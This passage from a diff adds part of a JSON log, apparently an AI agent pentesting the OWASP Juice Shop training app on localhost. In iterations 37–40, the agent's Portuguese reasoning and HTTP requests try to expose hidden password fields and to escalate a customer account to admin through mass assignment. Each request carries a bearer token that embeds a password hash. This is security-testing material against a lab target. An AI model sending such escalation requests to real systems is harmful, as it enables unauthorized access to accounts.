+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yMyAwMTo1NToyNS43MjggKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yMyAwMTo1NToyNS43MjggKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzkyNzIwNjMyfQ.XItLxTVuV6uYM8eiRdnIZ5rXeUZlTtm148nh9bO-GNtq-hOW5xgBjMYmpTx3xQxcI5WK0dRDNSorROfWHzlbq6Q6b3UaCC_0BkY1yIF5f693JisIGIhMEwsZJxEvWIdL7ij-waHClLP6OMYQZK4HjFMh1O08USxDLs0laI1RB_s"
+        }
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/api/Users/1\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"301\",\"etag\":\"W/\\\"12d-GeoqMQUqLOdN7gSR1ZZKZnDVfFI\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:58:56 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"status\": \"success\",\n  \"da",
+      "timestamp": "2026-10-23T01:58:56.490Z"
+    },
+    {
+      "iteration": 37,
+      "thought": "O endpoint oculta password, mas expõe role e outros dados. Vou tentar incluir campos ocultos via query ?filter[fields][password]=true ou ?filter={\"include\":\"...\"}. LoopBack suporta filtros. Testo /api/Users/?filter[fields][password]=true.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/api/Users/?filter[fields][password]=true",
+        "headers": {
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yMyAwMTo1NToyNS43MjggKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yMyAwMTo1NToyNS43MjggKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzkyNzIwNjMyfQ.XItLxTVuV6uYM8eiRdnIZ5rXeUZlTtm148nh9bO-GNtq-hOW5xgBjMYmpTx3xQxcI5WK0dRDNSorROfWHzlbq6Q6b3UaCC_0BkY1yIF5f693JisIGIhMEwsZJxEvWIdL7ij-waHClLP6OMYQZK4HjFMh1O08USxDLs0laI1RB_s"
+        }
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/api/Users/?filter[fields][password]=true\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"6070\",\"etag\":\"W/\\\"17b6-IiRPAtOQ+eC1R3OaDinwTtxdJFc\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:59:01 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:",
+      "timestamp": "2026-10-23T01:59:01.266Z"
+    },
+    {
+      "iteration": 38,
+      "thought": "O filtro de campos não retornou password. Vou tentar PATCH no próprio usuário para alterar role para admin (Mass Assignment / escalada vertical).",
+      "action": {
+        "action": "make_request",
+        "method": "PUT",
+        "url": "http://localhost:3000/api/Users/2",
+        "headers": {
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yMyAwMTo1NToyNS43MjggKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yMyAwMTo1NToyNS43MjggKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzkyNzIwNjMyfQ.XItLxTVuV6uYM8eiRdnIZ5rXeUZlTtm148nh9bO-GNtq-hOW5xgBjMYmpTx3xQxcI5WK0dRDNSorROfWHzlbq6Q6b3UaCC_0BkY1yIF5f693JisIGIhMEwsZJxEvWIdL7ij-waHClLP6OMYQZK4HjFMh1O08USxDLs0laI1RB_s",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "role": "admin"
+        }
+      },
+      "observation": "HTTP 401 PUT http://juice-shop:3000/api/Users/2\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:59:07 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"383\"}\nBody:\n{\n  \"error\": {\n    \"message\": \"error:1E08010C:DECODER routines::unsupported\",",
+      "timestamp": "2026-10-23T01:59:07.079Z"
+    },
+    {
+      "iteration": 39,
+      "thought": "O token foi rejeitado no PUT — talvez expirou ou há problema de verificação. Vou tentar PATCH e ver se é específico do método. Também vou testar se o GET ainda funciona com o mesmo token.",
+      "action": {
+        "action": "make_request",
+        "method": "GET",
+        "url": "http://localhost:3000/api/Users/2",
+        "headers": {
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yMyAwMTo1NToyNS43MjggKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yMyAwMTo1NToyNS43MjggKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzkyNzIwNjMyfQ.XItLxTVuV6uYM8eiRdnIZ5rXeUZlTtm148nh9bO-GNtq-hOW5xgBjMYmpTx3xQxcI5WK0dRDNSorROfWHzlbq6Q6b3UaCC_0BkY1yIF5f693JisIGIhMEwsZJxEvWIdL7ij-waHClLP6OMYQZK4HjFMh1O08USxDLs0laI1RB_s"
+        }
+      },
+      "observation": "HTTP 200 GET http://juice-shop:3000/api/Users/2\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"content-length\":\"297\",\"etag\":\"W/\\\"129-m9s0PXiXNe+0erU/aHppxtnPBJ8\\\"\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:59:11 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\"}\nBody:\n{\n  \"status\": \"success\",\n  \"da",
+      "timestamp": "2026-10-23T01:59:11.759Z"
+    },
+    {
+      "iteration": 40,
+      "thought": "GET funciona, PUT retornou erro de decoder. Pode ser bug específico de PUT. Vou tentar PATCH /api/Users/2 com role=admin.",
+      "action": {
+        "action": "make_request",
+        "method": "PATCH",
+        "url": "http://localhost:3000/api/Users/2",
+        "headers": {
+          "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImppbUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiZTU0MWNhN2VjZjcyYjhkMTI4NjQ3NGZjNjEzZTVlNDUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yMyAwMTo1NToyNS43MjggKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yMyAwMTo1NToyNS43MjggKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzkyNzIwNjMyfQ.XItLxTVuV6uYM8eiRdnIZ5rXeUZlTtm148nh9bO-GNtq-hOW5xgBjMYmpTx3xQxcI5WK0dRDNSorROfWHzlbq6Q6b3UaCC_0BkY1yIF5f693JisIGIhMEwsZJxEvWIdL7ij-waHClLP6OMYQZK4HjFMh1O08USxDLs0laI1RB_s",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "role": "admin"
+        }
+      },
+      "observation": "HTTP 500 PATCH http://juice-shop:3000/api/Users/2\nHeaders de resposta: {\"access-control-allow-origin\":\"*\",\"x-content-type-options\":\"nosniff\",\"x-frame-options\":\"SAMEORIGIN\",\"feature-policy\":\"payment 'self'\",\"x-recruiting\":\"/#/jobs\",\"content-type\":\"application/json; charset=utf-8\",\"vary\":\"Accept-Encoding\",\"date\":\"Fri, 23 Oct 2026 01:59:16 GMT\",\"connection\":\"keep-alive\",\"keep-alive\":\"timeout=5\",\"content-length\":\"1833\"}\nBody:\n{\n  \"error\": {\n    \"message\": \"Unexpected path: /api/Users/2\",\n    \"stack\"",
+      "timestamp": "2026-10-23T01:59:16.110Z"
+    }
+  ]
+}
